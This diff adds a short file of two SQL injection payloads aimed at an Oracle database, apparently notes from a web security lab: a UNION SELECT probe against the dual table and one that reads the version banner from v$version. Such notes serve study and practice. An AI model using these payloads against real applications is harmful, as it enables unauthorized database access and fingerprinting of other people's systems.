@@ -1,0 +1,6 @@
+Payloads:
+1. probe ->
+'+UNION+SELECT+'abc','def'+FROM+dual--
+
+2. Exploit ->
+'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
